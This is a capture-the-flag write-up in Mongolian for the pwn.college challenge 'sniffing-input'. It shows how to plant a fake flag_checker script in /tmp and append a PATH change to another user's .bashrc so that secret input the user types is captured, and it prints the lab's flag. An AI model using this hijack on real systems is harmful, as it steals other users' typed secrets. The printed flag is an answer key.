# Sniffing Input

> Module: **Linux Luminarium / Silly Shenanigans** · Challenge: `sniffing-input`

Зардус флагийг файлд орхихоо больж, `flag_checker`-т гараар бичиж оруулдаг болсон тул `.bashrc`-ээр `PATH`-ийг hijack хийж, түүний оруулах флагийг барьж авна.

## Тайлбар

- Өмнөх level-д зардусын `~/.bashrc`-д команд суулгаж түүгээр команд ажиллуулж байсан. Энэ удаа флаг readable файлд байхгүй — зардус `flag_checker` руу флагийг гараар бичдэг.
- Pondering PATH модулийн **command hijacking**-ийг ашиглаж болно: `PATH`-ийн урд өөрийн директорыг тавьж, `flag_checker` нэртэй хуурамч script байрлуулбал жинхэнэ `flag_checker`-ийн оронд минийх ажиллана.
- Зардус болгоомжтой — `Type the flag` prompt-ийг шалгадаг тул хуурамч script маань мөн тэр prompt-ийг хэвлэх ёстой. Дараа нь оруулсан флагийг `read`-ээр аваад `echo`-доно (эсвэл `cat`-аар stdout руу цацна).
- `/fakebin` үүсгэх эрхгүй (`Permission denied`) тул world-writable `/tmp/fakebin`-ийг ашиглана. Script-ийг `chmod +x`-ээр executable болгоно.

## Solution

```console
hacker@shenanigans~sniffing-input:~$ mkdir -p /tmp/fakebin
hacker@shenanigans~sniffing-input:~$ cat > /tmp/fakebin/flag_checker <<'EOF'
#!/bin/bash
echo "Type the flag"
read -r flag
echo "$flag"
EOF
hacker@shenanigans~sniffing-input:~$ chmod +x /tmp/fakebin/flag_checker
hacker@shenanigans~sniffing-input:~$ echo 'export PATH=/tmp/fakebin:$PATH' >> /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag
pwn.college{I2V0Jauq3qWYVPXWNawwO7l1ICw.0VNzEzNxwyMwEzM2EzW}
zardus@shenanigans~sniffing-input:~$ exit
logout
```

## Flag

```
pwn.college{I2V0Jauq3qWYVPXWNawwO7l1ICw.0VNzEzNxwyMwEzM2EzW}
```
